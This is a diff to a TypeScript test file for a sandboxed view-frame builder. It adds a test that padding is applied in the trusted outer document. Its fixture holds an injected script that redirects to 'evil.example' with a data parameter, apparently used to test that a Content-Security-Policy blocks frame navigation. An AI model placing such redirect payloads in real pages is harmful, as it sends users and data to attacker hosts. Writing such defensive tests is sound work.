@@ -8,6 +8,7 @@ import {
 	OUTER_RELAY_SCRIPT,
 	parseFrameMessage,
 	VIEW_CSP,
+	VIEW_FRAME_PADDING_PX,
 	VIEW_RUNTIME_SCRIPT,
 } from "../../src/genview/viewFrame";
 
@@ -66,6 +67,11 @@ describe("buildViewSrcdoc (inner document)", () => {
 describe("buildViewFrameSrcdoc (outer relay document)", () => {
 	const body = '<script>location.href = "https://evil.example/?d=1";</script><p>x</p>';
 	const outer = buildViewFrameSrcdoc(body, ":root { --a: b; }");
+
+	it("pads the view from the card edge in the trusted document", () => {
+		expect(outer).toContain(`padding: ${VIEW_FRAME_PADDING_PX}px`);
+		expect(buildViewSrcdoc("x", "")).not.toMatch(/body \{[^}]*padding/);
+	});
 
 	it("forbids the inner frame from navigating anywhere", () => {
 		expect(outer).toContain(`<meta http-equiv="Content-Security-Policy" content="${OUTER_FRAME_CSP}">`);
